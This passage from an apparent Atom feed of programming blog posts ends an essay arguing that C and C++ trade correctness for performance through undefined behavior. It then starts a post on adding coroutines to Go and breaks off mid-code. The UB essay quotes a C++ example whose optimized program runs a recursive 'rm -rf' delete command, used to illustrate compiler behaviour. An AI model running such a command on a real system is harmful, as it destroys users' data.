heart’s content.&#xA;This is exactly what the C standards committee decided to do.&#xA;&#xA;&lt;p&gt;&#xA;The rationale, paraphrased, was:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;It is very difficult to tell if a given loop is infinite.&#xA;&lt;li&gt;&#xA;Infinite loops are rare and typically unintentional.&#xA;&lt;li&gt;&#xA;There are many loop optimizations that are only valid for non-infinite loops.&#xA;&lt;li&gt;&#xA;The performance wins of these optimizations are deemed important.&#xA;&lt;li&gt;&#xA;Some compilers already apply these optimizations, making infinite loops non-portable too.&#xA;&lt;li&gt;&#xA;Therefore, we should declare programs with infinite loops undefined behavior, enabling the optimizations.&lt;/ul&gt;&#xA;&lt;a class=anchor href=&#34;#null&#34;&gt;&lt;h2 id=&#34;null&#34;&gt;Null pointer usage&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;We’ve all seen how dereferencing a null pointer causes a crash on modern operating systems:&#xA;they leave page zero unmapped by default precisely for this purpose.&#xA;But not all systems where C and C++ run have hardware memory protection.&#xA;For example, I wrote my first C and C++ programs using Turbo C on an MS-DOS system.&#xA;Reading or writing a null pointer did not cause any kind of fault:&#xA;the program just touched the memory at location zero and kept running.&#xA;The correctness of my code improved dramatically when I moved to&#xA;a Unix system that made those programs crash at the moment of the mistake.&#xA;Because the behavior is non-portable, though, dereferencing a null pointer is undefined behavior.&#xA;&#xA;&lt;p&gt;&#xA;At some point, the justification for keeping the undefined behavior became performance.&#xA;&lt;a href=&#34;http://blog.llvm.org/2011/05/what-every-c-programmer-should-know.html&#34;&gt;Chris Lattner explains&lt;/a&gt;:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;In C-based languages, NULL being undefined enables a large number of simple scalar optimizations that are exposed as a result of macro expansion and inlining.&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;In &lt;a href=&#34;plmm#ub&#34;&gt;an earlier post&lt;/a&gt;, I showed this example, lifted from &lt;a href=&#34;https://twitter.com/andywingo/status/903577501745770496&#34;&gt;Twitter in 2017&lt;/a&gt;:&#xA;&lt;pre&gt;#include &amp;lt;cstdlib&amp;gt;&#xA;&#xA;typedef int (*Function)();&#xA;&#xA;static Function Do;&#xA;&#xA;static int EraseAll() {&#xA;    return system(&#34;rm -rf slash&#34;);&#xA;}&#xA;&#xA;void NeverCalled() {&#xA;    Do = EraseAll;&#xA;}&#xA;&#xA;int main() {&#xA;    return Do();&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Because calling &lt;code&gt;Do()&lt;/code&gt; is undefined behavior when &lt;code&gt;Do&lt;/code&gt; is null, a modern C++ compiler like Clang&#xA;simply assumes that can’t possibly be what’s happening in &lt;code&gt;main&lt;/code&gt;.&#xA;Since &lt;code&gt;Do&lt;/code&gt; must be either null or &lt;code&gt;EraseAll&lt;/code&gt; and since null is undefined behavior,&#xA;we might as well assume &lt;code&gt;Do&lt;/code&gt; is &lt;code&gt;EraseAll&lt;/code&gt; unconditionally,&#xA;even though &lt;code&gt;NeverCalled&lt;/code&gt; is never called.&#xA;So this program can be (and is) optimized to:&#xA;&lt;pre&gt;int main() {&#xA;    return system(&#34;rm -rf slash&#34;);&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Lattner gives &lt;a href=&#34;https://blog.llvm.org/2011/05/what-every-c-programmer-should-know_14.html&#34;&gt;an equivalent example&lt;/a&gt; (search for &lt;code&gt;FP()&lt;/code&gt;)&#xA;and then this advice:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;The upshot is that it is a fixable issue: if you suspect something weird is going on like this, try building at -O0, where the compiler is much less likely to be doing any optimizations at all.&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;This advice is not uncommon: if you cannot debug the correctness problems in your C++ program, disable optimizations.&#xA;&lt;a class=anchor href=&#34;#sort&#34;&gt;&lt;h2 id=&#34;sort&#34;&gt;Crashes out of sorts&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;C++’s &lt;code&gt;std::sort&lt;/code&gt; sorts a collection of values&#xA;(abstracted as a random access iterator, but almost always an array)&#xA;according to a user-specified comparison function.&#xA;The default function is &lt;code&gt;operator&amp;lt;&lt;/code&gt;, but you can write any function.&#xA;For example if you were sorting instances of class &lt;code&gt;Person&lt;/code&gt; your&#xA;comparison function might sort by the &lt;code&gt;LastName&lt;/code&gt; field, breaking&#xA;ties with the &lt;code&gt;FirstName&lt;/code&gt; field.&#xA;These comparison functions end up being subtle yet boring to write,&#xA;and it’s easy to make a mistake.&#xA;If you do make a mistake and pass in a comparison function that&#xA;returns inconsistent results or accidentally reports that any value&#xA;is less than itself, that’s undefined behavior:&#xA;&lt;code&gt;std::sort&lt;/code&gt; is now allowed to do whatever it likes,&#xA;including walking off either end of the array&#xA;and corrupting other memory.&#xA;If you’re lucky, it will pass some of this memory to your comparison&#xA;function, and since it won’t have pointers in the right places,&#xA;your comparison function will crash.&#xA;Then at least you have a chance of guessing the comparison function is at fault.&#xA;In the worst case, memory is silently corrupted and the crash happens much later,&#xA;with &lt;code&gt;std::sort&lt;/code&gt; is nowhere to be found.&#xA;&#xA;&lt;p&gt;&#xA;Programmers make mistakes, and when they do, &lt;code&gt;std::sort&lt;/code&gt; corupts memory.&#xA;This is not hypothetical. It happens enough in practice to be a&#xA;&lt;a href=&#34;https://stackoverflow.com/questions/18291620/why-will-stdsort-crash-if-the-comparison-function-is-not-as-operator&#34;&gt;popular question on StackOverflow&lt;/a&gt;.&#xA;&#xA;&lt;p&gt;&#xA;As a final note, it turns out that &lt;code&gt;operator&amp;lt;&lt;/code&gt; is not a valid comparison function&#xA;on floating-point numbers if NaNs are involved, because:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;1 &amp;lt; NaN and NaN &amp;lt; 1 are both false, implying NaN == 1.&#xA;&lt;li&gt;&#xA;2 &amp;lt; NaN and NaN &amp;lt; 2 are both false, implying NaN == 2.&#xA;&lt;li&gt;&#xA;Since NaN == 1 and NaN == 2, 1 == 2, yet 1 &amp;lt; 2 is true.&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Programming with NaNs is never pleasant, but it seems particularly extreme&#xA;to allow &lt;code&gt;std::sort&lt;/code&gt; to crash when handed one.&#xA;&lt;a class=anchor href=&#34;#reveal&#34;&gt;&lt;h2 id=&#34;reveal&#34;&gt;Reflections and revealed preferences&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Looking over these examples,&#xA;it could not be more obvious that in modern C and C++,&#xA;performance is job one and correctness is job two.&#xA;To a C/C++ compiler, a programmer making a mistake and (gasp!)&#xA;compiling a program containing a bug is just not a concern.&#xA;Rather than have the compiler point out the bug or at least&#xA;compile the code in a clear, understandable, debuggable manner,&#xA;the approach over and over again is&#xA;to let the compiler do whatever it likes,&#xA;in the name of performance.&#xA;&#xA;&lt;p&gt;&#xA;This may not be the wrong decision for these languages.&#xA;There are undeniably power users for whom every last bit of performance&#xA;translates to very large sums of money, and I don’t claim&#xA;to know how to satisfy them otherwise.&#xA;On the other hand, this performance comes at a significant&#xA;development cost, and there are probably plenty of people and companies&#xA;who spend more than their performance savings&#xA;on unnecessarily difficult debugging sessions&#xA;and additional testing and sanitizing.&#xA;It also seems like there must be a middle ground where&#xA;programmers retain most of the control they have in C and C++&#xA;but the program doesn’t crash when sorting NaNs or&#xA;behave arbitrarily badly if you accidentally dereference a null pointer.&#xA;Whatever the merits, it is important to see clearly the choice that C and C++ are making.&#xA;&#xA;&lt;p&gt;&#xA;In the case of arithmetic overflow, later drafts of the&#xA;proposal removed the defined behavior for wrapping, explaining:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;The main change between [P0907r0] and the subsequent revision is to maintain undefined behavior when signed integer overflow occurs, instead of defining wrapping behavior. This direction was motivated by:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;Performance concerns, whereby defining the behavior prevents optimizers from assuming that overflow never occurs;&#xA;&lt;li&gt;&#xA;Implementation leeway for tools such as sanitizers;&#xA;&lt;li&gt;&#xA;Data from Google suggesting that over 90% of all overflow is a bug, and defining wrapping behavior would not have solved the bug.&lt;/ul&gt;&#xA;&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;Again, performance concerns rank first.&#xA;I find the third item in the list particularly telling.&#xA;I’ve known C/C++ compiler authors who got excited about a 0.1% performance improvement,&#xA;and incredibly excited about 1%.&#xA;Yet here we have an idea that would change 10% of affected programs from incorrect to correct,&#xA;and it is rejected, because performance is more important.&#xA;&#xA;&lt;p&gt;&#xA;The argument about sanitizers is more nuanced.&#xA;Leaving a behavior undefined allows any implementation at all, including reporting the&#xA;behavior at runtime and stopping the program.&#xA;True, the widespread use of undefined behavior enables sanitizers like ThreadSanitizer, MemorySanitizer, and UBSan,&#xA;but so would defining the behavior as “either this specific behavior, or a sanitizer report.”&#xA;If you believed correctness was job one, you could&#xA;define overflow to wrap, fixing the 10% of programs outright&#xA;and making the 90% behave at least more predictably,&#xA;and then at the same time define that overflow is still&#xA;a bug that can be reported by sanitizers.&#xA;You might object that requiring wrapping in the absence of a sanitizer&#xA;would hurt performance, and that’s fine: it’s just more evidence that&#xA;performance trumps correctness.&#xA;&#xA;&lt;p&gt;&#xA;One thing I find surprising, though, is that correctness gets ignored even&#xA;when it clearly doesn’t hurt performance.&#xA;It would certainly not hurt performance to emit a compiler warning&#xA;about deleting the &lt;code&gt;if&lt;/code&gt; statement testing for signed overflow,&#xA;or about optimizing away the possible null pointer dereference in &lt;code&gt;Do()&lt;/code&gt;.&#xA;Yet I could find no way to make compilers report either one; certainly not &lt;code&gt;-Wall&lt;/code&gt;.&#xA;&#xA;&lt;p&gt;&#xA;The explanatory shift from non-portable to optimizable also seems revealing.&#xA;As far as I can tell, C89 did not use performance as a justification for any of&#xA;its undefined behaviors.&#xA;They were non-portabilities, like signed overflow and null pointer dereferences,&#xA;or they were outright bugs, like use-after-free.&#xA;But now experts like Chris Lattner and Hans Boehm point to optimization potential,&#xA;not portability, as justification for undefined behaviors.&#xA;I conclude that the rationales really have shifted from the mid-1980s to today:&#xA;an idea that meant to capture non-portability has been preserved for performance,&#xA;trumping concerns like correctness and debuggability.&#xA;&#xA;&lt;p&gt;&#xA;Occasionally in Go we have &lt;a href=&#34;https://go.dev/blog/compat#input&#34;&gt;changed library functions to remove surprising behavior&lt;/a&gt;,&#xA;It’s always a difficult decision, but we are willing&#xA;to break existing programs depending on a mistake&#xA;if correcting the mistake fixes a much larger number of programs.&#xA;I find it striking that the C and C++ standards committees are&#xA;willing in some cases to break existing programs if doing so&#xA;merely &lt;i&gt;speeds up&lt;/i&gt; a large number of programs.&#xA;This is exactly what happened with the infinite loops.&#xA;&#xA;&lt;p&gt;&#xA;I find the infinite loop example telling for a second reason:&#xA;it shows clearly the escalation from non-portable to optimizable.&#xA;In fact, it would appear that if you want to break C++ programs in&#xA;service of optimization, one possible approach is to just do that in a&#xA;compiler and wait for the standards committee to notice.&#xA;The de facto non-portability of whatever programs you have broken&#xA;can then serve as justification for undefining their behavior,&#xA;leading to a future version of the standard in which your optimization is legal.&#xA;In the process, programmers have been handed yet another footgun&#xA;to try to avoid setting off.&#xA;&#xA;&lt;p&gt;&#xA;(A common counterargument is that the standards committee cannot&#xA;force existing implementations to change their compilers.&#xA;This doesn’t hold up to scrutiny: every new feature that gets added&#xA;is the standards committee forcing existing implementations&#xA;to change their compilers.)&#xA;&#xA;&lt;p&gt;&#xA;I am not claiming that anything should change about C and C++.&#xA;I just want people to recognize that the current versions of these&#xA;sacrifice correctness for performance.&#xA;To some extent, all languages do this: there is almost always a tradeoff&#xA;between performance and slower, safer implementations.&#xA;Go has data races in part for performance reasons:&#xA;we could have done everything by message copying&#xA;or with a single global lock instead, but the performance wins of&#xA;shared memory were too large to pass up.&#xA;For C and C++, though, it seems no performance win is too small&#xA;to trade against correctness.&#xA;&#xA;&lt;p&gt;&#xA;As a programmer, you have a tradeoff to make too,&#xA;and the language standards make it clear which side they are on.&#xA;In some contexts, performance is the dominant priority and&#xA;nothing else matters quite as much.&#xA;If so, C or C++ may be the right tool for you.&#xA;But in most contexts, the balance flips the other way.&#xA;If programmer productivity, debuggability, reproducible bugs,&#xA;and overall correctness and understandability&#xA;are more important than squeezing every last little bit of performance,&#xA;then C and C++ are not the right tools for you.&#xA;I say this with some regret, as I spent many years happily writing C programs.&#xA;&#xA;&lt;p&gt;&#xA;I have tried to avoid exaggerated, hyperbolic language in this post,&#xA;instead laying out the tradeoff and the preferences revealed&#xA;by the decisions being made.&#xA;John Regehr wrote a less restrained series of posts about undefined behavior&#xA;a decade ago, and in &lt;a href=&#34;https://blog.regehr.org/archives/226&#34;&gt;one of them&lt;/a&gt; he concluded:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;It is basically evil to make certain program actions wrong, but to not give developers any way to tell whether or not their code performs these actions and, if so, where. One of C’s design points was “trust the programmer.” This is fine, but there’s trust and then there’s trust. I mean, I trust my 5 year old but I still don’t let him cross a busy street by himself. Creating a large piece of safety-critical or security-critical code in C or C++ is the programming equivalent of crossing an 8-lane freeway blindfolded.&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;To be fair to C and C++,&#xA;if you set yourself the goal of crossing an 8-lane freeway blindfolded,&#xA;it does make sense to focus on doing it as fast as you possibly can.&#xA;</content>
  </entry>
  <entry>
    <title>Coroutines for Go</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/coro</id>
    <link rel="alternate" href="http://research.swtch.com/coro"></link>
    <published>2023-07-17T14:00:00-04:00</published>
    <updated>2023-07-17T14:02:00-04:00</updated>
    <summary type="text">Why we need coroutines for Go, and what they might look like.</summary>
    <content type="html">&#xA;&#xA;&lt;p&gt;&#xA;This post is about why we need a coroutine package for Go, and what it would look like.&#xA;But first, what are coroutines?&#xA;&#xA;&lt;p&gt;&#xA;Every programmer today is familiar with function calls (subroutines):&#xA;F calls G, which stops F and runs G.&#xA;G does its work, potentially calling and waiting for other functions, and eventually returns.&#xA;When G returns, G is gone and F continues running.&#xA;In this pattern, only one function is running at a time,&#xA;while its callers wait, all the way up the call stack.&#xA;&#xA;&lt;p&gt;&#xA;In contrast to subroutines, coroutines run concurrently on different stacks,&#xA;but it’s still true that only one is running at a time,&#xA;while its caller waits.&#xA;F starts G, but G does not run immediately.&#xA;Instead, F must explicitly &lt;i&gt;resume&lt;/i&gt; G, which then starts running.&#xA;At any point, G may turn around and &lt;i&gt;yield&lt;/i&gt; back to F.&#xA;That pauses G and continues F from its resume operation.&#xA;Eventually F calls resume again, which pauses F and continues G from its yield.&#xA;On and on they go, back and forth, until G returns, which cleans up G and&#xA;continues F from its most recent resume, with some signal to F that G is done&#xA;and that F should no longer try to resume G.&#xA;In this pattern, only one coroutine is running at a time,&#xA;while its caller waits on a different stack.&#xA;They take turns in a well-defined, coordinated manner.&#xA;&#xA;&lt;p&gt;&#xA;This is a bit abstract. Let’s look at real programs.&#xA;&lt;a class=anchor href=&#34;#lua&#34;&gt;&lt;h2 id=&#34;lua&#34;&gt;Coroutines in Lua&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;To use a &lt;a href=&#34;pcdata#gopher&#34;&gt;venerable example&lt;/a&gt;, consider comparing two binary trees&#xA;to see if they have the same value sequence, even if their structures are different.&#xA;For example, here is code in &lt;a href=&#34;https://lua.org&#34;&gt;Lua 5&lt;/a&gt; to generate some binary trees:&#xA;&lt;pre&gt;function T(l, v, r)&#xA;    return {left = l, value = v, right = r}&#xA;end&#xA;&#xA;e = nil&#xA;t1 = T(T(T(e, 1, e), 2, T(e, 3, e)), 4, T(e, 5, e))&#xA;t2 = T(e, 1, T(e, 2, T(e, 3, T(e, 4, T(e, 5, e)))))&#xA;t3 = T(e, 1, T(e, 2, T(e, 3, T(e, 4, T(e, 6, e)))))&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The trees &lt;code&gt;t1&lt;/code&gt; and &lt;code&gt;t2&lt;/code&gt; both contain the values 1, 2, 3, 4, 5; &lt;code&gt;t3&lt;/code&gt; contains 1, 2, 3, 4, 6.&#xA;&#xA;&lt;p&gt;&#xA;We can write a coroutine to walk over a tree and yield each value:&#xA;&lt;pre&gt;function visit(t)&#xA;    if t ~= nil then  -- note: ~= is &#34;not equal&#34;&#xA;        visit(t.left)&#xA;        coroutine.yield(t.value)&#xA;        visit(t.right)&#xA;    end&#xA;end&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Then to compare two trees, we can create two visit coroutines and&#xA;alternate between them to read and compare successive values:&#xA;&lt;pre&gt;function cmp(t1, t2)&#xA;    co1 = coroutine.create(visit)&#xA;    co2 = coroutine.create(visit)&#xA;    while true&#xA;    do&#xA;        ok1, v1 = coroutine.resume(co1, t1)&#xA;        ok2, v2 = coroutine.resume(co2, t2)&#xA;        if ok1 ~= ok2 or v1 ~= v2 then&#xA;            return false&#xA;        end&#xA;        if not ok1 and not ok2 then&#xA;            return true&#xA;        end&#xA;    end&#xA;end&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The &lt;code&gt;t1&lt;/code&gt; and &lt;code&gt;t2&lt;/code&gt; arguments to &lt;code&gt;coroutine.resume&lt;/code&gt; are only used on the first iteration,&#xA;as the argument to &lt;code&gt;visit&lt;/code&gt;.&#xA;Subsequent resumes return that value from &lt;code&gt;coroutine.yield&lt;/code&gt;, but the code ignores the value.&#xA;&#xA;&lt;p&gt;&#xA;A more idiomatic Lua version would use &lt;code&gt;coroutine.wrap&lt;/code&gt;, which returns a function&#xA;that hides the coroutine object:&#xA;&lt;pre&gt;&lt;span style=&#34;color: #aaa&#34;&gt;function cmp(t1, t2)&lt;/span&gt;&#xA;    next1 = coroutine.wrap(function() visit(t1) end)&#xA;    next2 = coroutine.wrap(function() visit(t2) end)&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    while true&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    do&lt;/span&gt;&#xA;        v1 = next1()&#xA;        v2 = next2()&#xA;        if v1 ~= v2 then&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            return false&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        end&lt;/span&gt;&#xA;        if v1 == nil and v2 == nil then&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            return true&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        end&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    end&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;end&lt;/span&gt;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;When the coroutine has finished, the &lt;code&gt;next&lt;/code&gt; function returns &lt;code&gt;nil&lt;/code&gt; (&lt;a href=&#34;https://gist.github.com/rsc/5908886288b741b847a83c0c6597c690&#34;&gt;full code&lt;/a&gt;).&#xA;&lt;a class=anchor href=&#34;#python&#34;&gt;&lt;h2 id=&#34;python&#34;&gt;Generators in Python (Iterators in CLU)&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Python provides generators that look a lot like Lua’s coroutines,&#xA;but they are not coroutines, so it’s worth pointing out the differences.&#xA;The main difference is that the “obvious” programs don’t work.&#xA;For example, here’s a direct translation of our Lua tree and visitor to Python:&#xA;&lt;pre&gt;def T(l, v, r):&#xA;    return {&#39;left&#39;: l, &#39;value&#39;: v, &#39;right&#39;: r}&#xA;&#xA;def visit(t):&#xA;    if t is not None:&#xA;        visit(t[&#39;left&#39;])&#xA;        yield t[&#39;value&#39;]&#xA;        visit(t[&#39;right&#39;])&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;But this obvious translation doesn’t work:&#xA;&lt;pre&gt;&amp;gt;&amp;gt;&amp;gt; e = None&#xA;&amp;gt;&amp;gt;&amp;gt; t1 = T(T(T(e, 1, e), 2, T(e, 3, e)), 4, T(e, 5, e))&#xA;&amp;gt;&amp;gt;&amp;gt; for x in visit(t1):&#xA;...     print(x)&#xA;...&#xA;4&#xA;&amp;gt;&amp;gt;&amp;gt;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;We lost 1, 2, 3, and 5. What happened?&#xA;&#xA;&lt;p&gt;&#xA;In Python, that &lt;code&gt;def visit&lt;/code&gt; does not define an ordinary function.&#xA;Because the body contains a &lt;code&gt;yield&lt;/code&gt; statement, the result is a generator instead:&#xA;&lt;pre&gt;&amp;gt;&amp;gt;&amp;gt; type(visit(t1))&#xA;&amp;lt;class &#39;generator&#39;&amp;gt;&#xA;&amp;gt;&amp;gt;&amp;gt;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The call &lt;code&gt;visit(t[&#39;left&#39;])&lt;/code&gt; doesn’t run the code in &lt;code&gt;visit&lt;/code&gt; at all.&#xA;It only creates and returns a new generator, which is then discarded.&#xA;To avoid discarding those results, you have to loop over the generator and re-yield them:&#xA;&lt;pre&gt;&lt;span style=&#34;color: #aaa&#34;&gt;&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;def visit(t):&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if t is not None:&lt;/span&gt;&#xA;        for x in visit(t[&amp;#39;left&amp;#39;]):&#xA;            yield x&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        yield t[&amp;#39;value&amp;#39;]&lt;/span&gt;&#xA;        for x in visit(t[&amp;#39;right&amp;#39;])&#xA;            yield x&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Python 3.3 introduced &lt;code&gt;yield&lt;/code&gt; &lt;code&gt;from&lt;/code&gt;, allowing:&#xA;&lt;pre&gt;&lt;span style=&#34;color: #aaa&#34;&gt;def visit(t):&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    if t is not None:&lt;/span&gt;&#xA;        yield from visit(t[&amp;#39;left&amp;#39;]):&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        yield t[&amp;#39;value&amp;#39;]&lt;/span&gt;&#xA;        yield from visit(t[&amp;#39;right&amp;#39;])&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The generator object contains the state of the single call to &lt;code&gt;visit&lt;/code&gt;,&#xA;meaning local variable values and which line is executing.&#xA;That state is pushed onto the call stack each time the generator is resumed&#xA;and then popped back into the generator object at each &lt;code&gt;yield&lt;/code&gt;,&#xA;which can only occur in the top-most call frame.&#xA;In this way, the generator uses the same stack as the original program,&#xA;avoiding the need for a full coroutine implementation&#xA;but introducing these confusing limitations instead.&#xA;&#xA;&lt;p&gt;&#xA;Python’s generators appear to be almost exactly copied from CLU,&#xA;which pioneered this abstraction (and so many other things),&#xA;although CLU calls them iterators, not generators.&#xA;A CLU tree iterator looks like:&#xA;&lt;pre&gt;visit = iter (t: cvt) yields (int):&#xA;    tagcase t&#xA;        tag empty: ;&#xA;        tag non_empty(t: node):&#xA;            for x: int&#xA;                in tree$visit(t.left) do&#xA;                    yield(x);&#xA;                    end;&#xA;            yield(t.value);&#xA;            for x: int&#xA;                in tree$visit(t.right) do&#xA;                    yield(x);&#xA;                    end;&#xA;        end;&#xA;    end visit;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The syntax is different, especially the &lt;code&gt;tagcase&lt;/code&gt; that is examining&#xA;a tagged union representation of a tree, but the basic structure,&#xA;including the nested &lt;code&gt;for&lt;/code&gt; loops, is exactly the same as our first&#xA;working Python version.&#xA;Also, because CLU was statically typed, &lt;code&gt;visit&lt;/code&gt; is clearly marked as an iterator (&lt;code&gt;iter&lt;/code&gt;)&#xA;not a function (&lt;code&gt;proc&lt;/code&gt; in CLU).&#xA;Thanks to that type information,&#xA;misuse of &lt;code&gt;visit&lt;/code&gt; as an ordinary function call,&#xA;like in our buggy Python example,&#xA;is something that the compiler could (and I assume did) diagnose.&#xA;&#xA;&lt;p&gt;&#xA;About CLU’s implementation, the original implementers wrote,&#xA;“Iterators are a form of coroutine; however, their use is sufficiently constrained&#xA;that they are implemented using just the program stack.&#xA;Using an iterator is therefore only slightly more expensive than using a&#xA;procedure.”&#xA;This sounds exactly like the explanation I gave above for the Python generators.&#xA;For more, see Barbara Liskov &lt;i&gt;et al.&lt;/i&gt;’s 1977 paper&#xA;“&lt;a href=&#34;https://dl.acm.org/doi/10.1145/359763.359789&#34;&gt;Abstraction Mechanisms in CLU&lt;/a&gt;”,&#xA;specifically sections 4.2, 4.3, and 6.&#xA;&lt;a class=anchor href=&#34;#thread&#34;&gt;&lt;h2 id=&#34;thread&#34;&gt;Coroutines, Threads, and Generators&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;At first glance, coroutines, threads, and generators look alike.&#xA;All three provide &lt;a href=&#34;pcdata&#34;&gt;concurrency&lt;/a&gt; in one form or another,&#xA;but they differ in important ways.&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Coroutines provide concurrency without parallelism:&#xA;when one coroutine is running, the one that resumed it&#xA;or yielded to it is not.&#xA;&#xA;&lt;p&gt;&#xA;Because coroutines run one at a time and only switch at specific&#xA;points in the program, the coroutines can share data among themselves&#xA;without races.&#xA;The explicit switches (&lt;code&gt;coroutine.resume&lt;/code&gt; in the first Lua example&#xA;or calling a &lt;code&gt;next&lt;/code&gt; function in the second Lua example)&#xA;serve as synchronization points, creating &lt;a href=&#34;gomm#gos_memory_model_today&#34;&gt;happens-before edges&lt;/a&gt;.&#xA;&#xA;&lt;p&gt;&#xA;Because scheduling is explicit (without any preemption)&#xA;and done entirely without the operating system,&#xA;a coroutine switch takes at most around ten nanoseconds, usually even less.&#xA;Startup and teardown is also much cheaper than threads.&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Threads provide more power than coroutines, but with more cost.&#xA;The additional power is parallelism, and the cost is&#xA;the overhead of scheduling, including more expensive context switches&#xA;and the need to add preemption in some form.&#xA;Typically the operating system provides threads,&#xA;and a thread switch takes a few microseconds.&#xA;&#xA;&lt;p&gt;&#xA;For this taxonomy, Go’s goroutines are cheap threads:&#xA;a goroutine switch is closer to a few hundred nanoseconds,&#xA;because the Go runtime takes on some of the scheduling work,&#xA;but goroutines still provide the full parallelism and preemption&#xA;of threads.&#xA;(Java’s new lightweight threads are basically the same as goroutines.)&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Generators provide less power than coroutines, because only&#xA;the top-most frame in the coroutine is allowed to yield.&#xA;That frame is moved back and forth between an object and the call stack&#xA;to suspend and resume it.&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Coroutines are a useful building block for writing programs that want&#xA;concurrency for program structuring&#xA;but not for parallelism.&#xA;For one detailed example of that, see my previous post,&#xA;“&lt;a href=&#34;pcdata&#34;&gt;Storing Data in Control Flow&lt;/a&gt;”.&#xA;For other examples, see Ana Lúcia De Moura and Roberto Ierusalimschy’s 2009 paper&#xA;“&lt;a href=&#34;https://dl.acm.org/doi/pdf/10.1145/1462166.1462167&#34;&gt;Revisiting Coroutines&lt;/a&gt;”.&#xA;For the original example, see Melvin Conway’s 1963 paper&#xA;“&lt;a href=&#34;https://dl.acm.org/doi/pdf/10.1145/366663.366704&#34;&gt;Design of a Separable Transition-Diagram Compiler&lt;/a&gt;”.&#xA;&lt;a class=anchor href=&#34;#why&#34;&gt;&lt;h2 id=&#34;why&#34;&gt;Why Coroutines in Go?&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Coroutines are a concurrency pattern not directly&#xA;served by existing Go concurrency libraries.&#xA;Goroutines are often close enough,&#xA;but as we saw,&#xA;they are not the same, and sometimes that difference matters.&#xA;&#xA;&lt;p&gt;&#xA;For example,&#xA;Rob Pike’s 2011 talk “&lt;a href=&#34;https://go.dev/talks/2011/lex.slide&#34;&gt;Lexical Scanning in Go&lt;/a&gt;”&#xA;presents the original lexer and parser for the &lt;a href=&#34;https://go.dev/pkg/text/template&#34;&gt;text/template package&lt;/a&gt;.&#xA;They ran in separate goroutines connected by a channel,&#xA;imperfectly simulating a pair of coroutines: the&#xA;lexer and parser ran in parallel, with the lexer looking ahead to&#xA;the next token while the parser processed the most recent one.&#xA;Generators would not have been good enough—the lexer yields values from many different functions—but&#xA;full goroutines proved to be a bit too much.&#xA;The parallelism provided by the goroutines caused races&#xA;and eventually led to abandoning the design&#xA;in favor of the lexer storing state in an object,&#xA;which was a more faithful simulation of a coroutine.&#xA;Proper coroutines would have avoided the races&#xA;and been more efficient than goroutines.&#xA;&#xA;&lt;p&gt;&#xA;An anticipated future use case for coroutines in Go&#xA;is iteration over generic collections.&#xA;We have discussed adding support to Go for&#xA;&lt;a href=&#34;https://github.com/golang/go/discussions/56413&#34;&gt;ranging over functions&lt;/a&gt;,&#xA;which would encourage authors of collections and other abstractions&#xA;to provide CLU-like iterator functions.&#xA;Iterators can be implemented today using function values, without any language changes.&#xA;For example, a slightly simplified tree iterator in Go could be:&#xA;&lt;pre&gt;func (t *Tree[V]) All(yield func(v V)) 